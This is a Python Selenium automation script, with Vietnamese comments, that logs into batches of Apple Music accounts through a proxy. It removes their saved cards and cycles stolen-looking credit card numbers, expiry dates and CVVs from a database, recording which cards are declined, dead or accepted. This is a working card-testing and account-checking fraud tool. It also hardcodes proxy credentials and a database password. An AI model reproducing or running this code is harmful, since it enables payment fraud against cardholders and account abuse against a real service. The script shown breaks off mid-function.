from seleniumwire import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time
import logging
import sys
import mysql.connector

# Class
class Tool_Exception:
    DONE = "done"
    DISSABLE = "Your account has been disabled. Contact Apple Support for more details."
    INVALID_PASSWORD = "Your Apple ID or password was incorrect."
    LOCK = "This Apple ID has been locked for security reasons."
    SUPPORT = "Contact Apple Support for more information."
    MANY = "This payment method is associated with too many Apple IDs. To continue, choose another payment method."
    INVALID_CARD = "Your credit card was declined. Please enter a valid credit card information."
    BOTH ="Thông tin thẻ bị sai"
    DIE = "This payment method can’t be used with the iTunes Store. Try again using another payment method."
    ACC_SPAM = "There was a problem when trying to add this payment method. Try again at a later time."
    ISSUE_METHOD = "There is an issue with your payment method. Update your payment information to correct the problem and try again."
    DEC = "Your payment method was declined. Please enter valid payment method information."
    DECLINED = "Payment Method Declined"

class Config:
    #web
    WEB_URL = "https://music.apple.com/us/login"
    # proxy config 
    PROXY_URL = {'https': 'https://brd-customer-hl_d346dd25-zone-static-country-us:jmkokxul20oa@brd.superproxy.io:22225'}
    
    #  config 
    DB_HOST = "159.65.2.46"
    DB_PORT = 3306
    DB_USER = "kaiser"
    DB_PASSWORD = "r!8R%OMm@=H{cVH6LZpqV]nye1G"
    DB_NAME = "apple_music"
    
    
class Account:
    def __init__(self, account, password):
        self._account = account
        self._password = password

    def get_account(self):
        return self._account

    def set_account(self, new_account):
        self._account = new_account

    def get_password(self):
        return self._password

    def set_password(self, new_password):
        self._password = new_password

class Card:
    def __init__(self, card_number, card_expiration, card_ccv):
        self._card_number = card_number
        self._card_expiration = card_expiration
        self._card_ccv = card_ccv

    def get_card_number(self):
        return self._card_number

    def set_card_number(self, new_card_number):
        self._card_number = new_card_number

    def get_card_expiration(self):
        return self._card_expiration

    def set_card_expiration(self, new_card_expiration):
        self._card_expiration = new_card_expiration

    def get_card_ccv(self):
        return self._card_ccv

    def set_card_ccv(self, new_card_ccv):
        self._card_ccv = new_card_ccv

class MySQLDatabase:
    def __init__(self, ):
        self.connection = mysql.connector.connect(
            host= "159.65.2.46",
            user="kaiser",
            password="r!8R%OMm@=H{cVH6LZpqV]nye1G",
            database="apple_music"
        )
        self.cursor = self.connection.cursor()

    def create_table(self, table_name, columns):
        column_str = ', '.join(columns)
        query = f"CREATE TABLE IF NOT EXISTS {table_name} ({column_str})"
        self.cursor.execute(query)
        self.connection.commit()
    
    def insert_data(self, table_name, data):
        placeholders = ', '.join(['%s' for _ in range(len(data))])
        query = f"INSERT INTO {table_name} VALUES ({placeholders})"
        self.cursor.execute(query, data)
        self.connection.commit()

    def update_data(self, table_name, set_values, condition):
        set_clause = ', '.join([f"{key} = %s" for key in set_values.keys()])
        query = f"UPDATE {table_name} SET {set_clause} WHERE {condition}"
        self.cursor.execute(query, list(set_values.values()))
        self.connection.commit()

    def delete_data(self, table_name, condition):
        query = f"DELETE FROM {table_name} WHERE {condition}"
        self.cursor.execute(query)
        self.connection.commit()

    def fetch_data(self, table_name, columns="*", condition=None):
        column_str = ', '.join(columns)
        query = f"SELECT {column_str} FROM {table_name}"
        if condition:
            query += f" WHERE {condition}"
        self.cursor.execute(query)
        return self.cursor.fetchall()

    def insert_credit_card_data(self, credit_card_data):
        card_number, expiration_month, expiration_year, cvv = credit_card_data.strip().split('|')
        query = "INSERT INTO pay (card_number, day, year, ccv) VALUES (%s, %s, %s, %s)"
        self.cursor.execute(query, (card_number, expiration_month, expiration_year, cvv))
        self.connection.commit()

    def insert_apple_music_id(self, id_data):
        account, password = id_data.strip().split('-')
        query = "INSERT INTO mail (user, password) VALUES (%s, %s)"
        self.cursor.execute(query, (account, password))
        self.connection.commit()
        pass
    def analysis_id_scusess(self):
        query = "SELECT m.user , m.password, p.card_number, p.`day`, p.`year`, p.ccv FROM mail m INNER JOIN pay p ON m.card_add = p.card_number"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        print(result)
        return result

    def export_error_id(self, error):
        query = None
        if error == 'country':
            query = "SELECT user, password, country FROM mail WHERE country IS NOT NULL"
            self.cursor.execute(query)
        else:
            query = "SELECT user, password FROM mail WHERE exception = %s"
            self.cursor.execute(query, (error,))

        result = self.cursor.fetchall()
        print(result)
        return result

    def export_pay_success(self):
        query = "SELECT card_number, day, year, ccv FROM pay"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        print(result)
        return result
    
    def analysis_pay_scusess(self):
        query = "SELECT card_number, `day`,`year`, ccv, number_use FROM pay WHERE number_use >= 1"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        print(result)
        return result

    def export_error_pay(self, error):
        query = "SELECT card_number, `day`, `year`, number_use,exception FROM pay WHERE exception = %s"
        self.cursor.execute(query, (error,))

        result = self.cursor.fetchall()
        print(result)
        return result
    
    def insert_mail_check(self, mail_check):
        try:
            mail = mail_check[0]
            password = mail_check[1]
            ctr_ex = mail_check[2]
            balance = mail_check[3]
        except IndexError:
    # Xử lý trường hợp mảng không đủ phần tử
            print("Mảng không đủ phần tử để lấy giá trị")

        query = "INSERT INTO mailCheck (mail, password, ctr_ex, balance) VALUES (%s, %s, %s, %s)"
        self.cursor.execute(query, (mail, password, ctr_ex, balance))
        self.connection.commit()
    def insert_mail_delete(self, mail_check):
        try:
            mail = mail_check[0]
            password = mail_check[1]
            ex = mail_check[2]
            ct = mail_check[3]
            have_card = mail_check[4]
            query = "INSERT INTO mailDelete (mail, pass, ex, ct, have_card) VALUES (%s, %s, %s, %s, %s)"
            self.cursor.execute(query, (mail, password, ex, ct, have_card))
            self.connection.commit()
        except Exception as e:
            print(e)
    
    def analysis_id_check(self):
        query = "SELECT mail, password, ctr_ex, balance FROM mailCheck"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        return result

    def analysis_id_delete(self):
        query = "SELECT mail, pass, ex , ct, have_card FROM mailDelete"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        return result

    def start_tool(self):
        query = "UPDATE operator SET run = 'Y'"
        self.cursor.execute(query)
        self.connection.commit()
    
    def close_tool(self):
        query = "UPDATE operator SET run = 'N'"
        self.cursor.execute(query)
        self.connection.commit()
        
    def check_operator_run(self):
        query = "SELECT run FROM operator"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        if result[0][0] == 'Y':
            return True
        else:
            return False
    def get_mail_wait(self):
        query = "SELECT * FROM mail_reg_apple_music_wait WHERE `status` = 'Y'"
        self.cursor.execute(query)
        result = self.cursor.fetchall()
        if result:
            return result
        else:
            return None
    def insert_mail_wait(self, mail_wait):
        query = "INSERT INTO mail_reg_apple_music_wait(mail) VALUES (%s)"
        self.cursor.execute(query, (mail_wait,))
        self.connection.commit()
    
    def insert_mail_reg_apple_music(self, mail):
        query = "INSERT INTO reg_apple_music_id(mail, password, card_number, month_exp, year_exp, ccv) VALUES (%s, %s, %s, %s, %s, %s)"
        self.cursor.execute(query, (mail[0], mail[1], mail[2], mail[3], mail[4], mail[5]))
        self.connection.commit()
        
    def close(self):
        self.connection.close()
        
tool_exception = Tool_Exception()
config = Config()
def check_account_is_block(browser):
    try:
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'h2')))
        text = browser.find_elements(By.TAG_NAME, 'h2')[0].text
        print(text)
        if text == tool_exception.LOCK:
            return True
        else:
            return False    
    except Exception as e:
            print(e)
            return False
def check_account_login_invalid_password(browser):
    try:
        err_element = browser.find_element(By.CSS_SELECTOR, 'p.fat#errMsg')
        if tool_exception.INVALID_PASSWORD == err_element.text:
            return True
        else:
            return False
    except:
        return False

def check_account_has_otp(browser):
    try:
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'verify-phone')))
        print("Has OTP")
        return True    
    except Exception as e:
            print(e)
            return False

#cài đặt proxy
option = {
    'proxy': 
        config.PROXY_URL
    
}
# Bắt đầu thao tác
# Đổi instance qua popup login
db_instance = MySQLDatabase()
logging.basicConfig(filename='./logs/errors.log', level=logging.ERROR, format='%(asctime)s - %(message)s',encoding='utf-8')
def run(browser):
    while(data := db_instance.fetch_data(table_name="mail", columns=["*"], condition="status = 1 and isRunning = 'N' limit 1")): 
        if db_instance.check_operator_run() == False:
            break
        db_instance.update_data(table_name="mail", set_values={"isRunning": "Y"}, condition="id = %s" % data[0][0])
        time.sleep(2)
        # browser = webdriver.Firefox(
        #     seleniumwire_options=option
        # )
        wait = WebDriverWait(browser, 20)

        if(data[0] is None): # Trường hợp hết mail
            logging.error("Error Account: %s", str("Hết account khả dụng trong database"))
            browser.close()
            break
    
        browser.get(config.WEB_URL)
    
        account = Account(data[0][1], data[0][2])
        try:
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR,  "#ck-container > iframe")))
            iframe = browser.find_element(By.CSS_SELECTOR, value= "#ck-container > iframe")
            browser.switch_to.frame(iframe)
        
        #Nhập account name
            wait.until(EC.visibility_of_element_located((By.ID, "accountName")))
            inputAccount = browser.find_element(By.ID, "accountName")
            inputAccount.send_keys(account.get_account())
        
        # Nhấn nút login
            browser.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]/div/div/div[3]/button").click()
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "#aid-auth-widget-iFrame")))
            iframe_auth = browser.find_element(By.CSS_SELECTOR, "#aid-auth-widget-iFrame")
            browser.switch_to.frame(iframe_auth)
        except Exception as e:
            logging.error("Error Tool: %s", str("Không bắt kịp request! Vui lòng kiểm tra mạng hoặc proxy"))
            continue
            # sys.exit()
    
    #Nhập password
        try:   # Chọn tới vị trí con trỏ hiện tại
            wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="password_text_field"]')))
            inputPassword = browser.find_element(By.XPATH, '//*[@id="password_text_field"]')
            inputPassword.send_keys(account.get_password())
            wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="sign-in"]')))
            browser.find_element(By.XPATH, '//*[@id="sign-in"]').click()
        #active_element = browser.switch_to.active_element
        #time.sleep(2)
        #active_element.send_keys(account.get_password())
        # Nhấn enter
        #active_element.send_keys(Keys.ENTER)
        #time.sleep(3)
        # Kiểm tra trường hợp bị lock
            if check_account_is_block(browser):
                logging.error("Error Account: Id -  %s", str(data[0][1] +" "+tool_exception.LOCK))
                db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "UnLock"}, condition=f"id = {data[0][0]}")
                browser.close()
                continue
        
            if check_account_login_invalid_password(browser):
                logging.error("Error Account: Id - %s", str(data[0][1] +"-" +tool_exception.INVALID_PASSWORD))
                db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "SaiPass"}, condition=f"id = {data[0][0]}")
                browser.close()
                continue
        
            time.sleep(5)
        # Kiểm tra acc có otp 
            if check_account_has_otp(browser):
                logging.error("Error Account: Id - %s", str(data[0][1] +"-"+"2FA"))
                db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "2FA"}, condition=f"id = {data[0][0]}")
                browser.close()
                continue
        # Lần đầu đăng nhập
            try:
                click_on_setting = False
                active_element = browser.switch_to.active_element
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.ENTER)
                time.sleep(5)
                click_on_setting = True
            # time.sleep(10)
            # browser.switch_to.default_content()
            # WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="ck-container"]')))
            # iframe_hello = browser.find_element(By.XPATH,'//*[@id="ck-container"]').find_element(By.TAG_NAME, 'iframe')
            # # src_value = iframe_hello.get_attribute("src")
            # browser.switch_to.frame(iframe_hello)
            # browser.find_element(By.TAG_NAME, 'button')
           
            # browser.find_element(By.TAG_NAME, 'button').click()
            # time.sleep(5)
    

            except Exception as e:
                click_on_setting = False
                print(e)
            
        
            browser.switch_to.default_content()
        # time.sleep(5)
        
        
        except Exception as e:
            logging.error("Error: %s", str("Không bắt kịp request! Vui lòng kiểm tra mạng hoặc proxy"))
            browser.close()
            continue
        browser.switch_to.default_content()
    # Đoạn này là đăng nhập đã thành công
    # Chuyển hướng sang trang cài đặt
        browser.get("https://music.apple.com/us/account/settings")
        if click_on_setting:
    # time.sleep(5)
        # time.sleep(5)
            WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')))
            iframe_hello = browser.find_element(By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')
            browser.switch_to.frame(iframe_hello)
            WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[4]/div/div[2]/div/div/div/div[5]/button')))
            browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[4]/div/div[2]/div/div/div/div[5]/button').click()
            time.sleep(5)
            browser.switch_to.default_content()
            browser.get("https://music.apple.com/us/account/settings")
# Đợi cái frame cài đặt hiển thị lên 
    

        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")))
        iframe_setting = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")

        iframe_setting = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")
        browser.switch_to.frame(iframe_setting)
    
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li')))
        country = browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li').text
        print(country)
        if country != "United States":
            db_instance.update_data(table_name="mail", set_values={"status": 0, "country": country}, condition=f"id = {data[0][0]}")
            browser.close()
            continue
    # click nút change payment 
        wait.until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[1]/ul/li[2]/button')))
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[1]/ul/li[2]/button').click()
        browser.switch_to.default_content()
    
        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")))
        iframe_payment = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")
        browser.switch_to.frame(iframe_payment)
    # Kiểm tra đã add thẻ 
    
        wait_child = WebDriverWait(browser, 10)
        try: 
            wait_child.until(EC.visibility_of_element_located((By.CLASS_NAME, 'payment-method-module-card')))
            browser.find_element(By.CLASS_NAME, 'payment-method-module-card').click()
        
        #Nhấn vào thẻ 
            wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-section-item[1]/div/button')))
            browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-section-item[1]/div/button').click()
        
        # Chuyển sang iframe thanh toán 
            browser.switch_to.default_content()
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "#ck-container > iframe:nth-child(1)")))
            iframe_child_payment = browser.find_element(By.CSS_SELECTOR, "#ck-container > iframe:nth-child(1)")
            browser.switch_to.frame(iframe_child_payment)
            print(iframe_child_payment)
        #Remove thẻ 
            wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/div/div/div[2]/div/div[4]/csk-button/button')))
            browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/div/div[2]/div/div[4]/csk-button/button').click()
        
        # Nhấn nút remove
            wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button')))
            browser.find_element(By.XPATH,'/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button').click()
        except Exception as e:
            print(e)
            browser.switch_to.default_content()
        # run_add_card = False
        # browser.close()
        # break
    # Vào lại iframe thanh toán
        browser.switch_to.default_content()
        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")))
        iframe_payment = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")
        browser.switch_to.frame(iframe_payment)
    # Nhấn nút add payment method
        wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-banner-card/div[2]/div/div[2]/div[2]/button')))
        browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-banner-card/div[2]/div/div[2]/div[2]/button').click()
        browser.switch_to.default_content()
        iframe_add_payment = browser.find_element(By.CSS_SELECTOR, "#ck-container > iframe:nth-child(1)")
        browser.switch_to.frame(iframe_add_payment)
    #Tìm thông tin thẻ 
        run_add_card = True
        while run_add_card:
            data_card = db_instance.fetch_data(table_name="pay", columns=["*"], condition="status = 1 limit 1")
            try:
                if data_card[0] is None:
                    logging.error("Error: %s", str("Hết thẻ"))
                    sys.exit() # Dừng cjương trình
            except IndexError:
                logging.error("Error: %s", str("Hết thẻ"))
                browser.close()
                sys.exit()
                pass  # hoặc thực hiện các hành động khác tương ứng
           
            card = Card(data_card[0][1], data_card[0][2]+""+ data_card[0][3], data_card[0][4])
            wait.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="creditCardNumber"]')))
            card_number_element = browser.find_element(By.XPATH,'//*[@id="creditCardNumber"]')
            card_number_element.clear()
            for i in card.get_card_number():
                card_number_element.send_keys(i)
                time.sleep(0.1)
        # browser.find_element(By.XPATH,'//*[@id="creditCardNumber"]').send_keys("")

            wait.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="creditCardExpirationMonth-creditCardExpirationYear"]')))
            card_expiration_element = browser.find_element(By.XPATH,'//*[@id="creditCardExpirationMonth-creditCardExpirationYear"]')
            card_expiration_element.clear()
            for i in card.get_card_expiration():
                card_expiration_element.send_keys(i)
                time.sleep(0.1)
        # browser.find_element(By.XPATH,'//*[@id="creditCardExpirationMonth-creditCardExpirationYear"]').send_keys("")

            wait.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="creditVerificationNumber"]')))
            card_ccv_element = browser.find_element(By.XPATH,'//*[@id="creditVerificationNumber"]')
            card_ccv_element.clear()
            for i in card.get_card_ccv():
                card_ccv_element.send_keys(i)
                time.sleep(0.1)
        # browser.find_element(By.XPATH,'//*[@id="creditVerificationNumber"]').send_keys("658")
            browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/div/div[3]/div/button').click()

        # Kiểm tra các trường hợp lỗi của thẻ 
            try:
                wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal")))
                add_payment_result = browser.find_element(By.CSS_SELECTOR, ".camk-modal-description")
            
                match add_payment_result.text:
                    case tool_exception.DISSABLE:
                        logging.error("Error Account: Id - %s", str(data[0][1] +" - "+"Account is disable"))
                        db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "Diss"}, condition=f"id = {data[0][0]}")
                        run_add_card = False # Dừng vì account bị disable
                        browser.close()
                    case tool_exception.MANY:
                        logging.error("Error Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is many account add"))
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "To Many ID"}, condition=f"id = {data_card[0][0]}")
                        wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    case tool_exception.INVALID_CARD:
                    # Thông tin thẻ sai
                        logging.error("Error Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is invalid"))
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Invalid Card"}, condition=f"id = {data_card[0][0]}")
                        wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    case tool_exception.SUPPORT:
                        logging.error("Error Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is support"))
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "contact suport"}, condition=f"id = {data_card[0][0]}")
                        wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    case tool_exception.DONE:
                        logging.info("Success Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is done"))
                        logging.info("Success Account: Id - %s", str(data[0][1] +" - "+"Account is done"))
                        db_instance.update_data(table_name="pay", set_values={"number_use": data_card[0][6]+1}, condition=f"id = {data_card[0][0]}")
                        db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "Done"}, condition=f"id = {data[0][0]}")
                        break
                    case tool_exception.DIE:
                        logging.error("Die Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is die"))
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Die"}, condition=f"id = {data_card[0][0]}")
                        wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    case tool_exception.ACC_SPAM:
                        logging.error("Error Account: Id - %s", str(data[0][1] +" - "+"Account is spam"))
                        db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "add sup"}, condition=f"id = {data[0][0]}")
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "add sup"}, condition=f"id = {data_card[0][0]}")
                        run_add_card = False
                        browser.close()
                    case tool_exception.ISSUE_METHOD:
                        logging.error("Error Card: Id - %s", str(data[0][1] +" - "+"Card Die"))
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Die"}, condition=f"id = {data_card[0][0]}")
                        wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                        continue
                    case tool_exception.DEC:
                        logging.error("Error Card: Id - %s", str(data[0][1] +" - "+"Card DEC"))
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "DEC"}, condition=f"id = {data_card[0][0]}")
                        wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                        continue
                    case tool_exception.DECLINED:
                        logging.error("Error Card: Id - %s", str(data[0][1] +" - "+"Card DEC"))
                        db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "DEC"}, condition=f"id = {data_card[0][0]}")
                        wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                        continue
                    case _:
                        logging.error("Error Card: Lỗi không xác định - %s", str(add_payment_result.text))
            except NoSuchElementException as e:
                logging.error("Error Card: Thông tin thẻ không hợp lệ - %s")
                db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Invalid Card"}, condition=f"id = {data_card[0][0]}")
                continue
            # wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
            # browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()

            except Exception as e: # Không có thông báo. => Add thẻ thành công
                logging.info("Success Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is done"))
                logging.info("Success Account: Id - %s", str(data[0][1] +" - "+"Account is done"))
                db_instance.update_data(table_name="pay", set_values={"number_use": data_card[0][6]+1}, condition=f"id = {data_card[0][0]}")
                db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "Done","card_add" : card.get_card_number()}, condition=f"id = {data[0][0]}")
                run_add_card = False
                browser.close()

def run_check():
    while(data := db_instance.fetch_data(table_name="mail", columns=["*"], condition="loginCheck = 'Y' and isRunningLoginCheck = 'N' limit 1")): 
        if db_instance.check_operator_run() == False:
            break
        db_instance.update_data(table_name="mail", set_values={"isRunningLoginCheck": "Y"}, condition="id = %s" % data[0][0])
        time.sleep(2)
        browser = webdriver.Firefox(
            seleniumwire_options=option
        )
        wait = WebDriverWait(browser, 20)

        if(data[0] is None): # Trường hợp hết mail
            logging.error("Error Account: %s", str("Hết account khả dụng trong database"))
            browser.close()
            break
    
        browser.get(config.WEB_URL)
    
        account = Account(data[0][1], data[0][2])
        try:
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR,  "#ck-container > iframe")))
            iframe = browser.find_element(By.CSS_SELECTOR, value= "#ck-container > iframe")
            browser.switch_to.frame(iframe)
        
        #Nhập account name
            wait.until(EC.visibility_of_element_located((By.ID, "accountName")))
            inputAccount = browser.find_element(By.ID, "accountName")
            inputAccount.send_keys(account.get_account())
        
        # Nhấn nút login
            browser.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]/div/div/div[3]/button").click()
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "#aid-auth-widget-iFrame")))
            iframe_auth = browser.find_element(By.CSS_SELECTOR, "#aid-auth-widget-iFrame")
            browser.switch_to.frame(iframe_auth)
        except Exception as e:
            logging.error("Error Tool: %s", str("Không bắt kịp request! Vui lòng kiểm tra mạng hoặc proxy"))
        # continue
            sys.exit()
    
    #Nhập password
        try:   # Chọn tới vị trí con trỏ hiện tại
            wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="password_text_field"]')))
            inputPassword = browser.find_element(By.XPATH, '//*[@id="password_text_field"]')
            inputPassword.send_keys(account.get_password())
            wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="sign-in"]')))
            browser.find_element(By.XPATH, '//*[@id="sign-in"]').click()
        #active_element = browser.switch_to.active_element
        #time.sleep(2)
        #active_element.send_keys(account.get_password())
        # Nhấn enter
        #active_element.send_keys(Keys.ENTER)
        #time.sleep(3)
        # Kiểm tra trường hợp bị lock
            if check_account_is_block(browser):
                logging.error("Error Account: Id -  %s", str(data[0][1] +" "+tool_exception.LOCK))
                db_instance.insert_mail_check([data[0][1], data[0][2],"UnLock",0])
                browser.close()
                continue
        
            if check_account_login_invalid_password(browser):
                logging.error("Error Account: Id - %s", str(data[0][1] +"-" +tool_exception.INVALID_PASSWORD))
                db_instance.insert_mail_check([data[0][1], data[0][2],"sai pass",0])
                browser.close()
                continue
        
            time.sleep(5)
        # Kiểm tra acc có otp 
            if check_account_has_otp(browser):
                logging.error("Error Account: Id - %s", str(data[0][1] +"-"+"2FA"))
                db_instance.insert_mail_check([data[0][1], data[0][2],"2FA",0])
                browser.close()
                continue
        # Lần đầu đăng nhập
            try:
                click_on_setting = False
                active_element = browser.switch_to.active_element
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.ENTER)
                time.sleep(5)
                click_on_setting = True
            # time.sleep(10)
            # browser.switch_to.default_content()
            # WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="ck-container"]')))
            # iframe_hello = browser.find_element(By.XPATH,'//*[@id="ck-container"]').find_element(By.TAG_NAME, 'iframe')
            # # src_value = iframe_hello.get_attribute("src")
            # browser.switch_to.frame(iframe_hello)
            # browser.find_element(By.TAG_NAME, 'button')
           
            # browser.find_element(By.TAG_NAME, 'button').click()
            # time.sleep(5)
    

            except Exception as e:
                click_on_setting = False
                print(e)
            
        
            browser.switch_to.default_content()
        # time.sleep(5)
        
        
        except Exception as e:
            logging.error("Error: %s", str("Không bắt kịp request! Vui lòng kiểm tra mạng hoặc proxy"))
            browser.close()
            continue
        browser.switch_to.default_content()
    # Đoạn này là đăng nhập đã thành công
    # Chuyển hướng sang trang cài đặt
        browser.get("https://music.apple.com/us/account/settings")
        if click_on_setting:
    # time.sleep(5)
        # time.sleep(5)
            WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')))
            iframe_hello = browser.find_element(By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')
            browser.switch_to.frame(iframe_hello)
            WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[4]/div/div[2]/div/div/div/div[5]/button')))
